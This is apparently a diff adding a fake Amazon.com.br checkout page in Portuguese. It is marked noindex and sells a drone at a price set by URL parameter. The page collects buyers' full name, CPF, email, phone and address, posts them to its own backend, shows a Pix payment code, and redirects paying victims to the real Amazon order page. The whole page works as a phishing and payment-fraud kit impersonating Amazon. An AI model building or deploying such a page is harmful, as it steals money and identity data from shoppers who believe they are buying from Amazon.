@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Amazon.com.br - Finalizar Compra</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --amazon-orange: #FF9900;
+            --amazon-dark: #232F3E;
+            --amazon-blue: #007185;
+            --amazon-yellow: #FFD814;
+            --amazon-yellow-hover: #F7CA00;
+            --text-base: #0F1111;
+            --text-secondary: #565959;
+            --border-color: #D5D9D9;
+            --bg-gray: #F0F2F2;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', Arial, sans-serif;
+            font-size: 14px;
+            line-height: 1.4;
+            color: var(--text-base);
+            background-color: #fff;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Header */
+        header {
+            background-color: #fff;
+            padding: 10px 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 100%;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .amazon-logo {
+            width: 140px;
+            display: block;
+        }
+
+        .checkout-title {
+            font-size: 18px;
+            font-weight: 400;
+            margin: 0;
+            color: var(--text-base);
+        }
+
+        .secure-icon {
+            color: #999;
+            display: flex;
+            align-items: center;
+            font-size: 20px;
+        }
+
+        /* Layout */
+        .container {
+            max-width: 1150px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: row;
+            gap: 20px;
+        }
+
+        .main-content {
+            flex: 1;
+        }
+
+        .sidebar {
+            width: 350px;
+        }
+
+        /* Sections */
+        .section-card {
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            background-color: #fff;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* Forms */
+        .form-row {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+
+        .form-group {
+            flex: 1;
+            min-width: 200px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group.small { flex: 0 0 100px; }
+        .form-group.full { flex: 0 0 1000%; }
+
+        label {
+            font-weight: 700;
+            margin-bottom: 4px;
+            font-size: 13px;
+        }
+
+        input, select {
+            padding: 8px 10px;
+            border: 1px solid #888C8C;
+            border-radius: 3px;
+            font-size: 14px;
+            outline: none;
+            height: 44px; /* Touch-friendly */
+            width: 100%;
+        }
+
+        input:focus {
+            border-color: var(--amazon-blue);
+            box-shadow: 0 0 3px 2px rgba(0, 113, 133, 0.15);
+        }
+
+        /* Order Summary Card */
+        .summary-box {
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            background-color: #fff;
+            position: sticky;
+            top: 70px;
+        }
+
+        .order-total-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .order-total-row.big {
+            font-size: 18px;
+            font-weight: 700;
+            color: #B12704;
+            border-top: 1px solid var(--border-color);
+            padding-top: 10px;
+            margin-top: 10px;
+        }
+
+        .btn-primary {
+            background-color: var(--amazon-yellow);
+            border: 1px solid #FCD200;
+            border-radius: 8px;
+            padding: 10px;
+            width: 100%;
+            font-size: 14px;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(15,17,17,.15);
+            margin-top: 15px;
+            font-weight: 700;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--amazon-yellow-hover);
+        }
+
+        /* Pix Section */
+        #pix-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            background: #fff;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+
+        .qr-code-img {
+            max-width: 200px;
+            margin: 20px 0;
+            padding: 10px;
+            border: 1px solid var(--border-color);
+        }
+
+        .copy-box {
+            background: var(--bg-gray);
+            padding: 10px;
+            border: 1px dashed #666;
+            border-radius: 4px;
+            width: 100%;
+            word-break: break-all;
+            margin: 10px 0;
+            font-family: monospace;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        /* Mobile specific */
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                padding: 10px;
+            }
+            .sidebar {
+                width: 100%;
+            }
+            .summary-box {
+                position: relative;
+                top: 0;
+                margin-bottom: 20px;
+            }
+            header {
+                padding: 10px 15px;
+            }
+            .checkout-title {
+                display: none; /* Hide subtitle on tiny screens if needed */
+            }
+            .form-group {
+                min-width: 100%;
+            }
+        }
+
+        /* Overlay for Loading if any */
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="Amazon_Pay_logo.svg.png" alt="Amazon Pay" class="amazon-logo">
+    <h1 class="checkout-title">Finalizar Pedido</h1>
+
+</header>
+
+<div class="container">
+    <div class="main-content">
+        <!-- 1. Identificação -->
+        <div class="section-card" id="section-personal">
+            <h2 class="section-title">1. Dados Pessoais</h2>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="full-name">Nome completo</label>
+                    <input type="text" id="full-name" placeholder="Ex: João da Silva" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="cpf">CPF</label>
+                    <input type="tel" id="cpf" placeholder="000.000.000-00" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">E-mail</label>
+                    <input type="email" id="email" placeholder="nome@exemplo.com" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="phone">Celular</label>
+                    <input type="tel" id="phone" placeholder="(00) 00000-0000" required>
+                </div>
+            </div>
+        </div>
+
+        <!-- 2. Endereço -->
+        <div class="section-card" id="section-address">
+            <h2 class="section-title">2. Endereço de entrega</h2>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="cep">CEP</label>
+                    <input type="tel" id="cep" placeholder="00000-000" maxlength="9" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="address">Endereço</label>
+                    <input type="text" id="address" placeholder="Rua, Avenida, Travessa..." required>
+                </div>
+                <div class="form-group small">
+                    <label for="number">Número</label>
+                    <input type="text" id="number" placeholder="123" required>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="complement">Complemento (Opcional)</label>
+                    <input type="text" id="complement" placeholder="Apto, Sala, Referência">
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="neighborhood">Bairro</label>
+                    <input type="text" id="neighborhood" required>
+                </div>
+                <div class="form-group">
+                    <label for="city">Cidade</label>
+                    <input type="text" id="city" required>
+                </div>
+                <div class="form-group small">
+                    <label for="state">Estado</label>
+                    <select id="state" required>
+                        <option value="">UF</option>
+                        <option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option><option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option><option value="DF">DF</option><option value="ES">ES</option><option value="GO">GO</option><option value="MA">MA</option><option value="MT">MT</option><option value="MS">MS</option><option value="MG">MG</option><option value="PA">PA</option><option value="PB">PB</option><option value="PR">PR</option><option value="PE">PE</option><option value="PI">PI</option><option value="RJ">RJ</option><option value="RN">RN</option><option value="RS">RS</option><option value="RO">RO</option><option value="RR">RR</option><option value="SC">SC</option><option value="SP">SP</option><option value="SE">SE</option><option value="TO">TO</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <!-- 3. Pagamento -->
+        <div class="section-card" id="section-payment">
+            <h2 class="section-title">3. Pagamento</h2>
+            <p style="margin-bottom: 10px;">Método selecionado: <strong>Pix</strong> (Pagamento instantâneo)</p>
+            <div style="background-color: #F7FEFF; border: 1px solid #A9E3F0; padding: 10px; border-radius: 4px;">
+                <p style="font-size: 13px; color: #007185;">O código Pix será gerado após clicar em "Finalizar Compra".</p>
+            </div>
+            
+            <!-- Pix Results (Hidden initially) -->
+            <div id="pix-container">
+                <p>Escaneie o código abaixo com o app do seu banco:</p>
+                <img src="" alt="QR Code Pix" class="qr-code-img" id="pix-qr">
+                <p>Ou copie o código copia e cola:</p>
+                <div class="copy-box" id="pix-code" onclick="copyPix()">
+                    Clique para copiar o código
+                </div>
+                <p style="font-size: 12px; color: var(--text-secondary); margin-top: 10px;">O pedido será processado imediatamente após a confirmação do pagamento.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="sidebar">
+        <div class="summary-box">
+            <h3 style="margin-bottom: 15px; font-size: 16px;">Resumo do pedido</h3>
+            
+            <div style="display: flex; gap: 10px; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px;">
+                <img id="product-img" src="assets/img/product-drone.jpg" alt="Drone" style="width: 60px; height: 60px; object-fit: contain;">
+                <div>
+                    <h4 style="font-size: 13px;">Drone DJI Mini Pro Professional 8K Obstacle Avoidance</h4>
+                    <p style="font-size: 12px; color: var(--text-secondary);">Quantidade: 1</p>
+                </div>
+            </div>
+
+            <div class="order-total-row">
+                <span>Itens:</span>
+                <span id="subtotal">R$ 0,00</span>
+            </div>
+            <div class="order-total-row">
+                <span>Frete:</span>
+                <span style="color: var(--amazon-blue);">R$ 0,00 (Grátis)</span>
+            </div>
+            <div class="order-total-row big">
+                <span>Total do pedido:</span>
+                <span id="total-price">R$ 0,00</span>
+            </div>
+            
+            <button class="btn-primary" id="btn-finish" onclick="processOrder()">Finalizar Compra</button>
+            
+            <p style="font-size: 11px; text-align: center; margin-top: 15px; color: var(--text-secondary);">
+                Ao clicar em "Finalizar Compra", você concorda com as condições de venda da Amazon.
+            </p>
+        </div>
+    </div>
+</div>
+
+<div id="loading-overlay">
+    <div style="text-align: center;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/de/Amazon_icon.svg" width="40" style="animation: spin 1s infinite linear;">
+        <p style="margin-top: 10px;">Gerando seu Pix...</p>
+    </div>
+</div>
+
+<style>
+@keyframes spin { from {transform: rotate(0deg);} to {transform: rotate(360deg);} }
+</style>
+
+<script>
+    // 1. Dynamic Price & Image Inheritance
+    const urlParams = new URLSearchParams(window.location.search);
+    const priceParam = urlParams.get('price') || '138,77';
+    const imgParam = urlParams.get('img');
+    
+    // Update Image if provided
+    if (imgParam) {
+        document.getElementById('product-img').src = imgParam;
+    }
+
+    const formattedPrice = parseFloat(priceParam.replace(',', '.')).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+    
+    document.getElementById('subtotal').innerText = formattedPrice;
+    document.getElementById('total-price').innerText = formattedPrice;
+
+    // Titans Analytics & Attribution
+    let attributionId = localStorage.getItem('amz_attribution_id');
+    const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
+    
+    async function initAttribution() {
+        if (!attributionId) {
+            try {
+                const res = await fetch('/api/analytics/attribution', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        url: window.location.href,
+                        referrer: document.referrer,
+                        userAgent: navigator.userAgent
+                    })
+                });
+                const data = await res.json();
+                if (data.attributionId) {
+                    attributionId = data.attributionId;
+                    localStorage.setItem('amz_attribution_id', attributionId);
+                }
+            } catch (e) {
+                console.error('Attribution error:', e);
+                attributionId = 'manual_' + Date.now();
+            }
+        }
+        
+        // Ping for analytics
+        fetch('/api/analytics/ping', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ pageId: 'checkout_unified', sessionId, attributionId })
+        });
+    }
+    initAttribution();
+
+    // 2. Input Masking
+    const mask = (id, fn) => {
+        const el = document.getElementById(id);
+        if (!el) return;
+        el.addEventListener('input', e => {
+            e.target.value = fn(e.target.value);
+        });
+    };
+
+    const cpfMask = v => v.replace(/\D/g, '').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})/, '$1-$2').replace(/(-\d{2})\d+?$/, '$1');
+    const cepMask = v => v.replace(/\D/g, '').replace(/(\d{5})(\d)/, '$1-$2').substring(0, 9);
+    const phoneMask = v => v.replace(/\D/g, '').replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{5})(\d)/, '$1-$2').substring(0, 15);
+
+    mask('cpf', cpfMask);
+    mask('cep', cepMask);
+    mask('phone', phoneMask);
+
+    // 3. ViaCEP Autocomplete
+    document.getElementById('cep').addEventListener('blur', function() {
+        const cep = this.value.replace(/\D/g, '');
+        if (cep.length === 8) {
+            fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                .then(res => res.json())
+                .then(data => {
+                    if (!data.erro) {
+                        document.getElementById('address').value = data.logradouro;
+                        document.getElementById('neighborhood').value = data.bairro;
+                        document.getElementById('city').value = data.localidade;
+                        document.getElementById('state').value = data.uf;
+                        document.getElementById('number').focus();
+                    }
+                });
+        }
+    });
+
+    // 4. Order Processing & Real Pix Generation
+    async function processOrder() {
+        const btn = document.getElementById('btn-finish');
+        const overlay = document.getElementById('loading-overlay');
+        
+        // Basic Validation
+        const inputs = document.querySelectorAll('input[required], select[required]');
+        let valid = true;
+        inputs.forEach(i => {
+            if (!i.value) {
+                i.style.borderColor = 'red';
+                valid = false;
+            } else {
+                i.style.borderColor = '#888C8C';
+            }
+        });
+
+        if (!valid) {
+            alert('Por favor, preencha todos os campos obrigatórios.');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            return;
+        }
+
+        overlay.style.display = 'flex';
+        
+        const buyerData = {
+            name: document.getElementById('name').value,
+            email: document.getElementById('email').value,
+            phone: document.getElementById('phone').value,
+            cpf: document.getElementById('cpf').value,
+            cep: document.getElementById('cep').value,
+            address: document.getElementById('address').value,
+            number: document.getElementById('number').value,
+            complement: document.getElementById('complement').value,
+            neighborhood: document.getElementById('neighborhood').value,
+            city: document.getElementById('city').value,
+            state: document.getElementById('state').value,
+            productName: "Drone DJI Mini Pro Professional 8K",
+            amount: parseFloat(priceParam.replace(',', '.'))
+        };
+
+        try {
+            const res = await fetch('/api/pix/create', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    attributionId,
+                    sessionId,
+                    buyer: buyerData,
+                    amount: buyerData.amount,
+                    pageId: 'checkout_unified'
+                })
+            });
+
+            const data = await res.json();
+            
+            if (data.ok && data.transaction) {
+                const pixCode = data.transaction.pix_code;
+                const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}`;
+                
+                document.getElementById('pix-qr').src = qrUrl;
+                document.getElementById('pix-code').innerText = pixCode;
+                document.getElementById('pix-container').style.display = 'flex';
+                
+                overlay.style.display = 'none';
+                btn.style.display = 'none';
+                
+                document.getElementById('pix-container').scrollIntoView({ behavior: 'smooth' });
+                
+                // Start Polling
+                startPolling(data.transaction.id);
+            } else {
+                throw new Error(data.message || 'Erro ao gerar PIX');
+            }
+        } catch (e) {
+            overlay.style.display = 'none';
+            alert('Falha ao processar pedido: ' + e.message);
+        }
+    }
+
+    let pollingInterval = null;
+    function startPolling(transactionId) {
+        if (pollingInterval) clearInterval(pollingInterval);
+        
+        pollingInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/pix/status/${transactionId}`);
+                const data = await res.json();
+                
+                if (data.ok && (data.status === 'paid' || data.status === 'approved' || data.status === 'completed')) {
+                    clearInterval(pollingInterval);
+                    alert('Pagamento aprovado! Redirecionando...');
+                    window.location.href = 'https://www.amazon.com.br/gp/css/history/orders'; // Redirect to real orders or a success page
+                }
+            } catch (e) {
+                console.error('Polling error:', e);
+            }
+        }, 5000);
+    }
+
+    function copyPix() {
+        const code = document.getElementById('pix-code').innerText;
+        navigator.clipboard.writeText(code).then(() => {
+            alert('Código Pix copiado com sucesso!');
+        });
+    }
+</script>
+
+</body>
+</html>
